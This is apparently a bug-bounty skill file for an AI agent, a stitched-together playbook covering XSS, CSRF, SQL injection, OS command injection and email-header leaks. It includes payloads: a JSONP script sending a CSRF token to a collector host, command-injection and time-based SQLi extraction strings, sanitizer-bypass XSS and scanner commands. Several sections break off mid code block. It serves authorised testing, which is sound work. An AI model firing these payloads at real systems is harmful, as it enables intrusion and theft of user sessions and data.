# xss — part 1/29 (97 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] 1. Domain intake — new domain mentioned = new profile skill

The moment a domain appears in conversation for the first time — even casually, even without
a `/hunt` — register it:

1. Create `domains/<domain>/SKILL.md` using `references/domain-template.md` as the skeleton.
2. Set the frontmatter `description` so the profile advertises itself (e.g. "Recon notes,
   attack surface, and tested-history for <domain>..."). This is what makes the domain show
   up as a usable skill later.
3. Fill in whatever is already known from conversation (program, scope, tech guesses,
   previous findings) and leave honest `unknown` markers elsewhere. An incomplete profile
   with real unknowns beats a plausible-looking fiction.
4. Before filling in a section from memory, **verify or mark it as a guess**. Profiles are
   load-bearing — a stale or wrong "stack: nginx/PHP" entry sends the next hunt down the
   wrong path for an hour.

If the profile already exists, load it and update rather than overwrite. Never destroy
tested-history entries; append.

## [Bugbountyskills.md] V-04: SameSite Strict subdomain takeover cross-context execution

**Also known as:** v2.1 "SameSite=Strict subdomain takeover cross-context CSRF execution".
**Mechanism:** SameSite is a *registrable-domain* boundary, not a host boundary — `Strict`/`Lax` cookies flow to every schemeful same-site sibling (`*.example.com`). An attacker hosting content anywhere in that zone (dangling DNS, unclaimed S3/Azure/GitHub Pages/Heroku CNAME, HTML upload feature) gets same-site status, so even `Strict` cookies ride their requests. Violated assumption: "Strict = no cross-context request possible."

**Preconditions:**
- A takeover-able or attacker-influenced sibling subdomain (usually an in-scope finding of its own — check program rules).
- Cookie `Domain=.example.com` (or attacker hosts where the cookie is scoped); victim logged in.
- Same scheme: `http://evil.example.com` vs `https://app.example.com` is **cross-site** under schemeful same-site rules.

**Detect:**
1. Subdomain enum → dangling CNAMEs to unclaimed cloud targets (S3, Azure, github.io, herokuapp, pantheon) and user-content hosts (`<user>.example.com`).
2. From a page on the candidate subdomain, fire a credentialed request to the app and inspect whether the `Strict`/`Lax` cookie was attached (DevTools) — impossible from a truly cross-site origin, which isolates the mechanism.
3. Confirm cookie scope: any `Domain=` in `Set-Cookie`, or `document.cookie` readable on the sibling host; verify scheme match before writing the claim.

**Proof of concept:**
```html
<form id="f" method="POST" action="https://app.<TARGET_DOMAIN>/<STATE_CHANGING_PATH>">
  <input type="hidden" name="<PARAM>" value="<VALUE>"></form>
<script>document.getElementById('f').submit();</script><!-- hosted on the attacker sibling -->
```

**Confirm:** (a) network capture of the Strict cookie attached from the sibling-hosted page, (b) persisted state change re-fetched as victim; plus an explicit scope note (takeover host in-scope, or chain with the takeover report).

**False positives:** subdomain on a *different* registrable domain (`example.co.uk`, unrelated apex) — not same-site; scheme mismatch (http vs https); you attached the cookie manually rather than the browser doing it; a "takeover" that is only a cloud 404 page — you cannot host HTML there, so no CSRF (takeover ≠ content control); CDN/asset subdomains where the session cookie is never present (cookie path/domain decides).

**Impact:** defeats the strongest SameSite posture (`Strict`) on every unguarded endpoint; if the takeover also allows JS hosting, chain to V-18 for XSS-assisted CSRF. Report the over-broad `Domain=` cookie scope alongside the takeover.

**Remediation:** make session cookies host-only (omit `Domain`), monitor dangling DNS, register predictable sibling domains, and keep token validation so a hostile sibling still cannot forge requests.

**CWE / OWASP:** CWE-352, CWE-346 (Origin Validation Error); OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] V-15: Flash based CSRF and crossdomain.xml policy hijacking

**Also known as:** classic "Flash-based CSRF" + "crossdomain.xml exploitation" (folded) / v2.1 "Flash-based cross-domain policy specification hijacking (crossdomain.xml misconfiguration)".
**Mechanism:** legacy cross-domain *policy files* are an explicit SOP waiver — a client fetches `/crossdomain.xml` (Flash) or `/clientaccesspolicy.xml` (Silverlight) and, if the policy allows the attacker's domain or `*`, sends credentialed, custom-verb, custom-header requests and reads responses that CORS would never permit. Flash is EOL (blocked since 2021), so treat this as legacy-plus-hygiene: the file still documents cross-origin intent, policy-consuming clients (old plugins, some WebViews, embedding runtimes) still honor it, and it is hard evidence of an unmaintained posture worth attaching to an active CSRF (V-01).

**Preconditions:**
- Policy file served by the app host itself (not a CDN default) — `/crossdomain.xml`, `/clientaccesspolicy.xml`, `/crossdomain.socketpolicy`, or socket policy on TCP 843.
- Permissive content: `domain="*"`, `allow-request-headers-from … headers="*"`, `secure="false"` on an https app, or legacy wildcard/suffix-matching quirks (`*.example.com`-adjacent matchers that old players mis-suffix-match).
- A policy-consuming client exists in scope (legacy kiosk/plugin, mobile WebView, embedded player) — otherwise downgrade to informational.

**Detect:**
1. Fetch raw and save exact contents: `/crossdomain.xml`, `/clientaccesspolicy.xml`, `curl <TARGET>:843/`.
2. Parse for `domain="*"` (worst), `*.example.com` with an attacker-reachable sibling (links V-04), wildcard header grants, `allow-from` IP/userinfo tricks, `secure="false"`.
3. Identify the server: app origin vs CDN boilerplate (CDN default with no sensitive routes on that origin is context, not a finding).
4. Pair with an active leg: does the same origin expose a token-less mutator (V-01) or a readable sensitive GET (V-14)? The policy alone rarely stands as High.

**Proof of concept:**
```bash
curl -sS -D - 'https://<TARGET_HOST>/crossdomain.xml'
curl -sS -D - 'https://<TARGET_HOST>/clientaccesspolicy.xml'

## [Bugbountyskills.md] V-18: XSS assisted CSRF and DOM based token theft

**Also known as:** classic "XSS-assisted CSRF" + "DOM-based token theft" (folded).
**Mechanism:** attacker JavaScript on the app origin defeats CSRF outright — it reads the token (never `HttpOnly` by design: meta tags, inline state, cookies, `localStorage`) or skips tokens and issues credentialed requests with ambient session state. The DOM-theft leg needs weaker footing: the token merely *leaks* — reflected into `innerHTML`, served by a cross-origin-readable endpoint (JSONP `?callback=`, permissive CORS on the token route), handed out via `postMessage` without origin checks, or dropped into `Referer` when a token sits in a query string. Violated assumption: "CSRF controls survive when JS runs or reads on the origin."

**Preconditions:**
- XSS anywhere on the app origin (or same registrable zone) — finding the XSS itself routes to `xss-testing` — **or** a token-read sink: JSONP, CORS-readable token endpoint, unchecked `postMessage`, token-in-URL `Referer` leak.
- Token readable by JS (inherent to CSRF tokens); session cookie rides normally.

**Detect:**
1. Inventory token exposure: `<meta name="csrf-token">`, `window.__CSRF__`, inline `var csrf=...`, `XSRF-TOKEN` cookie, `localStorage`.
2. Hunt read primitives: JSONP-wrapped sensitive GETs (`?callback=`), token endpoint under permissive CORS (V-14), `postMessage` handlers posting tokens without `event.origin` checks, token-in-URL landing in `Referer` on outbound links (put a subresource on your attacker page and watch the header arrive), open redirects chaining fragments.
3. Chain from `xss-testing`: if an XSS exists, one probe proves both that it can read the token and execute the V-01 request.
4. DOM clobbering angle: find where the token is read via `querySelector(...)` after attacker-influenced DOM mutation — clobbering the read target is DOM-based theft *without* script execution.

**Proof of concept:**
```html
<script>const t=document.querySelector('meta[name="csrf-token"]').content;
fetch('/<PATH>',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':t},
  body:'<BUSINESS_PARAM>=<VALUE>'});</script>
<script>function steal(d){fetch('https://<COLLECTOR>/?t='+encodeURIComponent(d.token),{mode:'no-cors'});}</script>
<script src="https://<TARGET_HOST>/api/token?callback=steal"></script>
```

**Confirm:** the token value (redacted) observed exfiltrated to your collector **or** the privileged action executed by injected JS in a real browser — **and** root-cause isolation: XSS present → report there with CSRF as impact; leak sink without script execution → report here as CSRF-enabling disclosure.

**False positives:** a token in a meta tag is the *standard pattern*, not a finding — readable-by-JS is required by design; you need a read primitive, not a location. Calling it CSRF when the real bug is XSS (severity, remediation and bounty differ); JSONP on a non-sensitive endpoint (no token, no PII → nothing); `postMessage` to a *same-origin* parent (correct usage — check `event.origin` before claiming); a hypothetical sink you never observed actually receiving the token.

**Impact:** total bypass of every CSRF control (SameSite, tokens, Origin checks) for the session lifetime — arbitrary state change, plus session theft when XSS is involved; for the standalone leak leg, demonstrate a forged request using the leaked value to prove it is enabling, not theoretical.

**Remediation:** fix the underlying XSS/token-leak first (see `xss-testing`), limit token exposure to pages that need it, add `event.origin` allow-lists to every `postMessage`, kill token-bearing URLs in `Referer` (Referrer-Policy + POST bodies), and keep per-request tokens so a leaked value has a short window.

**CWE / OWASP:** CWE-352 + CWE-79 (XSS) / CWE-200 (token disclosure); OWASP A01 + A03 Injection (2021), legacy A8:2017 with A7:2017.

## [Bugbountyskills.md] V-14: Internal domain/hostname leakage via intranet SMTP/email header metadata

**Mechanism:** Outbound mail leaks directory infrastructure: `Received:` chains name
every hop (`mail01.corp.example.internal`), `X-Originating-IP` exposes the sending app
server, `Message-ID` embeds internal FQDNs, `X-Mailer`/`Return-Path` reveal MTA and
app version. Violated assumption: "headers are invisible to users" — they're visible to
anyone who can *receive* mail (signup, password reset, contact form). The violated
boundary is intranet → internet: internal naming walks out with every message.

**Preconditions:**
- You can trigger an email to an inbox you own via normal features (not abuse).
- The mail path adds revealing headers (most MTAs and many senders do).

**Detect:**
1. Trigger 1-2 messages (password reset, signup, contact form); get *raw headers*
   (Gmail "Show original", or `python3 -m email` on the file).
2. Parse the chain bottom-up: each `Received:` `by`/`from`/`with ESMTP` token
   (`mail01.<internal>`, `smtp-gw02.private`), `X-Originating-IP:`, `X-Mailer:`,
   `X-MS-Exchange-*` (O365 internal routing names), `Message-ID: <…@smtp.internal>`,
   `List-Unsubscribe:` URLs, `DKIM-Signature d=`.
3. Classify each name: genuine internal FQDN (leak) vs vendor SaaS (`smtp.sendgrid.net`
   — vendor infra, note but don't overclaim) vs public MX (normal, not a leak).
4. Correlate with V-04: `X-Originating-IP` internal or matching a mapped host =
   two-signal topology node.

**Proof of concept:**
```http
POST /<password-reset-endpoint> HTTP/1.1
Host: <TARGET.HOST>
Content-Type: application/x-www-form-urlencoded

email=<your-owned-test-address>
```
Raw header excerpt (redacted): `Received: from <mail01>.<internal-domain>
([10.0.<a>.<b>]) by <target-mx> …` / `Message-ID: <…@<app-internal-host>.<corp-domain>>`.
Evidence = structure with names/IPs masked (`mail01.•••`, `[10.0.•••]`).

**Confirm:** Two signals: the internal hostname in two independent header positions
(`Message-ID` **and** `Received`) or across two mail types — **and** it plausibly
belongs to the target's own infra (matches their naming, resolves nowhere public;
SendGrid's own hostnames aren't "internal leaks").

**False positives:** Standard public relays (`gmail.com`, `amazonses.com` — normal);
`X-Originating-IP` showing the mail SaaS's *public* IP; Message-ID domains of the
provider (vendor infra); *your* mail client's headers at the top of the chain (read
bottom-up — the topmost `Received` is your MTA!); the target's own publicly-documented
MX (published in DNS = not leaked); test senders out of scope.

**Impact:** "Emails to any user disclose internal mail infrastructure and app-server
addresses, extending the internal topology map (V-04) and identifying the origin behind
the CDN; with an SSRF this removes target discovery." Low/medium alone; escalates when
the leak includes a *credentialed* artifact (check link query params for signed tokens)
or enables `ssrf-testing` targeting. Follow the program's policy on masking full
internal FQDNs.

**Remediation:** Configure the MTA/relay to rewrite internal `Received:` details and
drop `X-Originating-IP`, route outbound app mail through an anonymizing relay, and
make `Message-ID` use the public domain only.

**CWE / OWASP:** CWE-200, CWE-668 — OWASP A05:2021; WSTG-INFO-02/04.

---

## [Bugbountyskills.md] V-01: OS command string injection via unsanitized input concatenation

**Mechanism:** The application builds a shell command by concatenating user
input into a string passed to `system()` / `exec($cmd)` / `os.system(cmd)` /
`child_process.exec(...)`. Shell metacharacters in the input become syntax
instead of data — the trust assumption "input is a value" is violated the
moment the string hits the shell.

**Preconditions:**
- The param flows into a *shell string*, not a fixed argv array (`execve`-style
  calls without `/bin/sh -c` are not injectable this way — check which sink you have)
- Metacharacters (`; & | $ \` \n`) survive validation, or the filter is bypassable
- A shell exists in the runtime image (distroless/scratch containers don't)
- Common homes: ping/health-check, export/convert, "diagnostics", dig/lookup features

**Detect:**
1. Inventory candidate params: `host`, `ip`, `domain`, `file`, `format`,
   `dest`, plus regression-y features named `ping`, `check`, `trace`.
2. Send the benign baseline (`host=example.com`), record timing + response shape.
3. Safe probe first: `example.com;<PLACEHOLDER_OOB_DOMAIN>.<TOKEN>` (ladder §1
   in `payloads.md`) — expect a DNS/HTTP hit on your collaborator. DNS-only
   (`nslookup`) before HTTP keeps the first step minimal.
4. No callback? Try time-based with *scaling*: `; sleep 3` then `; sleep 7`
   then `; sleep 3`. Linear scaling with your values is control, not noise.
5. Only after 3+4: one benign output probe (`; id #`) for a reflected uid —
   that is your impact proof ceiling in production.
6. Filtered? Escalate encodings: `${IFS}`, `%0a`, `%0d%0a`, `ca""t`,
   `{cat,/etc/hostname}`, base64 pipe (payloads.md §1/§3). Windows targets:
   `&`, `|`, `%COMSPEC%`, case flipping; note `\r\n` for header contexts.

**Proof of concept:**
```
GET /api/ping?host=<PLACEHOLDER_HOST> HTTP/1.1

baseline: host=example.com
OOB:      host=example.com;<PLACEHOLDER_OOB_DOMAIN>.<TOKEN>
time:     host=example.com; sleep <N> #
```

**Confirm:** Two orthogonal signals — the collaborator DNS query name embeds
your payload context (shell parsed the `;`) *and* the sleep scaling or the
reflected `id` reproduces on re-send. A lone collaborator hit or a lone slow
response is not confirmation.

**False positives:** The app resolves your hostname with its own DNS lookup —
your collaborator gets a hit even with *no* injection (the query name tells
you: a plain lookup of your domain ≠ shell-parsed `;` payload). Ping tools
that return non-zero exit text that happens to contain your input is
reflection, not execution. WAF/browser synthetic checks hitting your OOB.
App-level `timeout` mimicking a sleep — hence scaling.

**Impact:** Remote code execution as the service account — read/modify app
data and secrets, pivot into the internal network (pair with `ssrf-testing` V-01/V-03), and
on shared hosts, affect other tenants. Phrase as "RCE as `<user>` on
`<host-class>` with access to `<app secrets class>`", not "I own the server".

**Remediation:** Invoke the binary with a fixed argv array (no shell) and
validate values against a strict allowlist regex (e.g. hostname grammar)
before the call — never interpolate input into a shell string.

**CWE / OWASP:** CWE-78 (OS Command Injection); OWASP Top 10 A03:2021
Injection; WSTG — Testing for OS Command Injection.

## [Bugbountyskills.md] V-12: Automated time-delay evasion via polyglot SQLi execution blocks

**Mechanism:** Signature filters accept only payloads that look like *several
grammars at once* — SQL valid across engines *and* shell/comment/JS contexts — or
they accept payloads whose delay expression is wrapped in a polyglot block that
parses as harmless text to the filter but evaluates at the DBMS. Techniques:
multi-engine delay wrappers (`CASE WHEN` + coalesce of engine-specific sleeps
guarded by `IF(...,SLEEP(1),0)` that degrades gracefully), ternary/comment polyglots
(`'/**/OR/**/'1'='1'/**/`), quote-balance polyglots (payload valid with or without
a surrounding quote: `OR 1=1-- ` and `' OR '1'='1`), and payload shapes where the
*only* observable effect is time — so content filters that only score response
bodies miss it. The violated assumption: "the filter sees what the DB evaluates."

**Preconditions:**
- Time-based channel is the surviving oracle (V-04 prerequisites apply).
- Filter/WAF accepts or partially passes the polyglot; some payloads are engineered so *both* parse paths are valid.
- Automated tooling (sqlmap tamper scripts) in play — the variant is about *generating/rolling* polyglots systematically.

**Detect:**
1. Run the V-04 differential first — polyglot evasion is pointless if plain timing already works.
2. Build a polyglot delay wrapper and test each engine path *individually* in your lab: MySQL `IF(<cond>,SLEEP(2),0)`, MSSQL `IF(<cond>) WAITFOR DELAY '0:0:2'`, Postgres `(CASE WHEN <cond> THEN pg_sleep(2) END)`, Oracle `DBMS_PIPE.RECEIVE_MESSAGE` — a true polyglot carries several, neutralized by comment guards: e.g.
   `' OR IF(<cond>,SLEEP(2),0)-- ` for MySQL and
   `' OR 1=CASE WHEN <cond> THEN ... END-- ` for ANSI-ish engines.
3. Probe quote-balance polyglots: `1 OR 1=1-- ` (numeric, unquoted) and `1' OR '1'='1` (string) — a param may accept only one shape; test both without assuming.
4. Comment-polyglot: `1'/**/OR/**/1=1-- ` vs `1' OR 1=1-- ` — if only the comment form passes the filter, note which serializer was in play (V-11 overlap).
5. Escalate: data-bearing condition inside the polyglot delay
   (`IF(ASCII(SUBSTR((SELECT ...),1,1))=97,SLEEP(2),0)`) — proves the block is an
   *executing* injection, not a slow filter.

**Proof of concept:**
- Quote-balance polyglot: `<BASELINE> OR 1=1-- ` and `'<BASELINE>' OR '1'='1'-- ` (same param, two shapes).
- Multi-engine conditional delay (MySQL-first):
  `' OR IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>108,SLEEP(2),0)-- `
- Comment-wrapped: `'/**/OR/**/IF(1=1,SLEEP(2),0)--%20`
- sqlmap tamper-style polyglot (see `payloads.md` §3): `--tamper=comment,between,randomcase` with `--technique=T`.

**Confirm:** Differential timing (V-04 method) on the polyglot: true branch ≫ false
branch, 3/3, same shape — plus a second signal from a *differently-shaped* payload
family (boolean flip if any body channel exists, or OOB callback per V-05). Report
both shapes.

**False positives:** The filter's own latency inflating *both* branches (scan cost —
compare true vs false of identical shape, never payload vs baseline alone);
polyglots that are valid in *neither* engine so the DB errors slowly; MySQL
`IF(cond,SLEEP(2),0)` where `cond` errors → error path *without* sleep → false
negative read as "WAF blocked"; `WAITFOR DELAY` inside an `IF` needing a statement
context (not an expression) — juniors jam it into `SELECT` and misread the failure;
and claiming "polyglot bypass" when the payload only ever worked on the lab engine,
not the target's. Also: a *random* 2-3s delay is not your oracle — control branch.

**Impact:** Sustained blind exfiltration under an active filter; report which
polyglot shape + timing table; severity same as V-04 but with the extra note that
defenses (WAF signatures) were bypassed — often a separate WAF-bypass finding.

**Remediation:** Parameterize (kills all shapes at once); run WAF rules on decoded
canonically-normalized payloads; alert on conditional-latency patterns regardless
of payload shape.

**CWE / OWASP:** CWE-89, CWE-184 — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] >> xss-testing — SKILL.md

*Source: `/root/Myskill/xss-testing/SKILL.md`*

## [Bugbountyskills.md] XSS Testing Playbook

18 advanced variants. The classic taxonomy is folded into the front of the playbook:
reflected context-boundary testing is V-02, DOM-based is V-03, stored is V-04, and blind
is V-05 — learn those four first, everything else is a specialization of them. Payload
templates, probe sets, WAF-evasion encodings and tool commands live in `references/`.

## [Bugbountyskills.md] <Title: e.g. Reflected XSS in /search via q parameter (HTML text context)>

**Severity:** <Critical/High/Medium/Low — state the deciding factor, e.g. "stored,
fires on any visitor, CSP not present">
**Endpoint:** <METHOD https://host/path?param=...>

## [Bugbountyskills.md] >> xss-testing — payloads.md (request templates, tool commands, evasion)

*Source: `/root/Myskill/xss-testing/references/payloads.md`*

## [Bugbountyskills.md] Payloads, probes, encodings & tools — xss-testing

All templates use `<PLACEHOLDER>` slots — substitute `<TARGET>`, `<PARAM>`, `<PROOF>`,
`<OOB_DOMAIN>`, etc. Proof markers stay inert: `alert(document.domain)`, a `<zz…>` DOM
element, or a ping to **your own** collaborator domain. Never exfiltrate real users' data.

Placeholder glossary:

| Placeholder | Meaning |
|---|---|
| `<TARGET>` | In-scope host (host + port) |
| `<PATH>` | In-scope path |
| `<PARAM>` | Parameter under test |
| `<PROOF>` | Inert proof function, e.g. `alert(document.domain)` |
| `<MARKER>` | Inert tag/text probe, e.g. `zz1` |
| `<OOB_DOMAIN>` | Your collaborator/hook domain (Burp, interactsh, VPS) |
| `<UNIQ>` | Unique ID per field/payload so callbacks are attributable |
| `<FRAMEWORK>` | Detected framework: `angular1` / `vue2` / `vue3` / `svelte` |
| `<SANITIZER>` | Detected sanitizer: `dompurify` / `sanitize-html` / custom |

---

### [Bugbountyskills.md] 2.9 Mutation / sanitizer context (V-07)

Namespace-switching scaffold (adjust per sanitizer version):
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=<PROOF>>
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=<PROOF>&gt;">
<svg></p><style><g title="</style><img src=x onerror=<PROOF>>">
```
Test procedure: `el.innerHTML = sanitizerOutput; el.innerHTML = el.innerHTML;` — the
handler should appear only after the round-trip.

## [Bugbountyskills.md] 3. Detection / polyglot probe set (non-destructive)

Ordered from quietest to loudest. Every marker is inert: text node, tag name, or
`alert(document.domain)`. **No exfiltration of real user data — ever.**

| # | Probe | What a hit tells you |
|---|---|---|
| 1 | `zz<UNIQ>` | Plain-text reflection (baseline — every param gets this) |
| 2 | `<zz1>` | HTML text context, `<` not encoded |
| 3 | `"><zz2>` | Double-quoted attribute breakout |
| 4 | `'><zz3>` | Single-quoted attribute breakout |
| 5 | `" autofocus onfocus=zz4 x=` | Unquoted attribute / handler slot |
| 6 | `</script><zz5>` | JS-in-script or script-boundary reflection |
| 7 | `{{7*7}}` / `${7*7}` | Client-side template evaluation (V-08) |
| 8 | `<zz6><!--` | Comment context / parser nesting quirk |
| 9 | `#zz7` (fragment) | DOM-source reflection only visible client-side (V-03) |

Polyglot probe (fires in text, attribute, comment, title, and script-adjacent contexts —
single request when context is unknown):
```text
jaVasCript:/*-/*`/*'/*"/**/(/* </zz8> <zz8> */) <zz9> "
```
Fire-and-reduce variant (proof-grade, still inert):
```text
"-'><zz9 onerror=alert(document.domain)>   <!-- works: unquoted attr, text, single/double attr -->
```
Angular-flavored polyglot (only if AngularJS detected): `{{constructor.constructor('alert(document.domain)')()}}`

Delivery habit: put `<UNIQ>` in every probe so a later hit (especially blind, V-05) tells
you *which* parameter and *which* rung of the ladder fired.

---

## [Bugbountyskills.md] Passive: collect URLs+params from a crawl, filter to XSS-shaped reflections

cat <OUT>/urls.txt | grep -E '(\?|&)[a-z_]+=' | sort -u > params.txt

## [Bugbountyskills.md] kxss — reflection pass (stdin URLs; look for its "reflection" lines per param)

cat params.txt | kxss | tee kxss.txt

## [Bugbountyskills.md] gf + dalfox combo — pattern-select XSS-prone params first

cat urls.txt | gf xss | httpx -silent -mc 200 | dalfox pipe

## [Bugbountyskills.md] nuclei — XSS template suites (keep out-of-band templates pointed at YOUR OOB domain)

nuclei -l urls.txt -t http/fuzzing/xss/ -dol --rate-limit 50
nuclei -l urls.txt -tags xss -severity critical,high,medium \
  -var target=<TARGET> -var oob=<OOB_DOMAIN>

## [Bugbountyskills.md] Custom minimal nuclei-style template skeleton (write to xss-marker.yaml)

cat > xss-marker.yaml <<'EOF'
id: xss-reflected-marker
info:
  name: Reflected XSS marker probe
  severity: info
http:
  - raw:
      - |
        GET /<PATH>?<PARAM>=<zzprobe123> HTTP/1.1
        Host: {{TargetHostname}}
    matchers:
      - type: word
        part: body
        words: ["<zzprobe123>"]
        negative: false
EOF

## [Bugbountyskills.md] >> xss-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/xss-testing/references/variants-1.md`*

## [Bugbountyskills.md] Variants 1-9 — xss-testing

Classic taxonomy folded in: V-02 = reflected, V-03 = DOM-based, V-04 = stored, V-05 = blind.
V-01 is the transport matrix that applies to all four. Payload templates and probe sets live
in `payloads.md`.

## [Bugbountyskills.md] V-01: Multi-transport parameter reflection (POST/GET XSS matrix)

**Mechanism:** The app reflects request data regardless of transport — query string, form body, JSON, multipart field, or logged header — into an HTML response. The violated assumption is "input comes from the URL bar": frameworks copy query params into POST handlers, merge request super-globals, and reflect `User-Agent`/`Referer` on error pages. Attackers who only fuzz GET never reach the sink.

**Preconditions:**
- At least one endpoint reflects request data into HTML (any transport).
- Parameter discovery covers POST/JSON/multipart, not just query strings.
- No CSP, or `script-src` with inline/`unsafe-eval` (bypassable).

**Detect:**
1. Fuzz the parameter list as GET, then re-run the same list as `POST` form bodies; diff which transports reflect.
2. Replay one logical request three ways: `?q=<zz1>`, `q=<zz1>` form body, JSON `{"q":"<zz1>"}` — record which echo.
3. Send `<zz1>` in `User-Agent`, `Referer`, `X-Forwarded-For`, then trigger an error/admin-log view — header XSS hides there.
4. For each reflecting transport, note the render context separately (transport matrix ≠ context matrix).

**Proof of concept:**
```bash
curl -s -X POST 'https://<TARGET>/search' -H 'User-Agent: <MARKER>' --data 'q=<MARKER>' \
  | grep -o '.\{40\}<MARKER>.\{40\}'     # repeat with ?q=<MARKER> on the same path
```

**Confirm:** the executing payload fires from a transport you believed unexploitable, in a real browser, and raw responses from the other transports show the same byte sequence (one render path, multiple feeds).

**False positives:** WAF/framework error pages echoing your probe on *every* request (check status + body template); header reflections visible only to your own session (self-XSS — downgrade); parameters your tooling duplicated across transports, making it look like one request hit two sinks. Also: **reflection count ≠ reflection risk on SSR frameworks** — Next.js App Router will reflect one query param up to 4+ places at once (body `href`, inline RSC JSON, `next-router-state-tree`, `<link rel=canonical>` + every `hreflang` mirror), which looks spectacular in a grep and is still safe if each occurrence is percent-encoded. Check the *encoding state per occurrence*, not the hit count — a 2026-10 session showed 73 reflections of one param across 25 hreflang tags with zero unencoded bytes.

**Impact:** report per reflecting transport — a POST-only reflected XSS is still attacker-deliverable via an auto-submitting form on any origin, so severity equals GET-based; mention transport breadth because scanners and WAF rules usually watch only one.

**Remediation:** route every transport through one output-encoding chokepoint at the render layer; logged headers and request bodies are display data, not trusted input.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-02: Immediate context reflection boundary evasion (RXSS)

**Mechanism:** Reflected XSS breaks out of the exact syntactic context where the server drops your bytes: tag text, attribute value, JS string, event handler, or URL. Evasion = choosing the breakout that matches the *real* context instead of the assumed one. The violated assumption: "the template framework encodes it" — it encodes for one context; reflection into a different (or bypassed) context loses that guarantee.

**Preconditions:**
- Parameter reflects in the same response.
- Reflection survives into rendered output, not only a JSON/JS-escaped string.
- Response parsed as HTML (`text/html`, or sniffable — see V-17).

**Detect:**
1. Run the context ladder from `payloads.md` §3: `<zz1>` → `"><zz2>` → `'><zz3>` → `</tag><zz4>`, reading raw bytes after each to pinpoint the boundary.
2. Determine attribute quoting (double / single / unquoted) and whether a framework re-encodes `<`, `>`, `&`, quotes on the way out.
3. Check where the reflection sits — `<title>`, `<textarea>`, `<style>`, `<script>`, comments each need their closing delimiter first.

**Context sub-notes (pick the breakout that matches):**
- **HTML text:** `<zz1>` suffices; close the surrounding `<title>`/`<textarea>`/`<style>`/comment first.
- **Attribute:** `"><zz1>` (double), `'><zz1>` (single), `" autofocus onfocus=zz1` (unquoted — no `>` needed).
- **JavaScript:** escape the string quote first: `';zz1;//` or `";zz1;//`; backticks in template literals; numeric slots take `1,zz1`.
- **Event-handler:** already JS but gated by HTML — `"><img src=x onerror=zz1>` or break the handler string with `zz1//`.
- **URL/URI:** `javascript:zz1` in `href` (click needed) vs `iframe src` (no click); `data:text/html,...` where allowed.
- **VBScript (legacy IE only):** `onmouseover="vbscript:..."` — a footnote unless scope pins old IE; note it and move on.
- **HTML entity / Unicode:** entities reflecting raw (`&#97;`) mean decode-order — that is V-12; here just establish whether decode happens before or after escaping.

**Proof of concept:**
```bash
curl -s 'https://<TARGET>/search?q=%22%3E%3Czz2%3E' | grep -c '<zz2>'   # attribute breakout

## [Bugbountyskills.md] V-03: Client-side sink exploitation (DOM-based XSS source analysis)

**Mechanism:** Attacker data flows entirely in the browser — a *source* (`location.hash`, `document.URL`, `window.name`, `postMessage`, `localStorage`) is read into a *sink* (`innerHTML`, `document.write`, `eval`, string-`setTimeout`, `.src`/`.href`) with no server round-trip. The violated assumption: "the server never saw my payload" — the bug lives in the JavaScript, not the response.

**Preconditions:**
- A reachable source flows (possibly via helpers) into a dangerous sink.
- No sanitizer between them, or one weaker than the sink (see V-07).
- The vulnerable JS ships to victims (frontend bundle / loaded CDN script).

**Detect:**
1. Grep bundles/source maps for sources: `location.hash|location.search|document.URL|document.referrer|window.name|postMessage|localStorage|URLSearchParams`.
2. Grep for sinks: `innerHTML|outerHTML|insertAdjacentHTML|document.write|eval(|new Function|setTimeout(` with string first arg, `.src =`, `.href =`, jQuery `$(...)/.html(`.
3. Dynamic: hook `Element.prototype.innerHTML` (or break on the sink) in DevTools, visit with `#<zz1>` / `?<p>=<zz1>`, watch your bytes arrive.
4. Trace intermediate helpers (`decodeURIComponent`, custom `escapeHtml`, `DOMPurify.sanitize`) — a helper decides exploitability vs. false lead.

**SPA bundle-graph funnel (for Vite/module-federation apps, no source maps):** (1) reconstruct chunks from the lazy-import map in the main bundle (`import("./Chunk-<hash>.js")`) plus the route-constants table (`e.routeName="/path"`); (2) download every chunk; (3) intersect source chunks with sink chunks; (4) hand-trace each intersection's dataflow; (5) confirm ambiguous ones in a real browser; (6) dynamic sink-hook sweep across reachable routes as a backstop. Static dataflow predicted every dynamic result — trust it, and spend browser time only on the ambiguous links.

**Two high-value false-positive patterns (verify before reporting):**
- **Router-bound sinks:** a URL param flowing into `<Link to={param}>`, `history.push(param)`, or an apparent `location.replace(param)` that is actually a route-builder hardcoding a leading `/`. react-router v5 `createHref` normalizes a raw `javascript:`/`https://evil` value by prepending `/`, turning it into an inert same-origin path. Only a protocol-relative `//host` survives, and only as an open-redirect gated on a modifier click (ctrl+click / open-in-new-tab). Settle the question offline with a local `react-router-dom@<version>` harness before claiming a finding.
- **postMessage → innerHTML:** if the handler gates on `e.origin === <fixed constant>`, it is not attacker-reachable unless that exact host is separately compromised — that is a chain, not a standalone bug.

**Hook gotcha (dynamic sweeps):** an init script that overrides the `Function` constructor (or `eval`/`setTimeout`) can crash module-init (e.g. Vite) so the app never boots — the result is a false "0 hits." Always run a positive control (a known-working sink) on every sweep; if the control does not fire, fix the instrumentation before trusting any zeros.

**Pre-check gotcha (cheaper than any hook — run it before the sweep):** confirm the app's JS *actually loads at all*. In importmap apps the HTML carries `<script type="importmap">{"imports":{"application":"/assets/application-<digest>.js"}}</script>` + `<script type="module">import "application"</script>` + `<link rel="modulepreload" href="/assets/application-<digest>.js">`; **fetch that target and check the status code** (202-10-25, sandbox.reready.co: the preloaded/imported bundle returned 404 while the unhashed `/assets/application.js` returned 200 — the whole jQuery/Bootstrap/rails-ujs bundle never executed, so every DOM sink in it was dead code). If the entry module 404s (deploy mismatch: HTML digest ≠ file on disk) or a bundler chunk fails to load, a "0 fires" sweep means nothing about vulnerability — the same class of false-clean as the hook crash above, but detectable offline with one HEAD. Also grep the page for `<script src=` before assuming the bundle you downloaded is the one the browser runs.

**Proof of concept:**
```text
https://<TARGET>/app/#<payload-from-payloads.md-§2.1/§2.2>
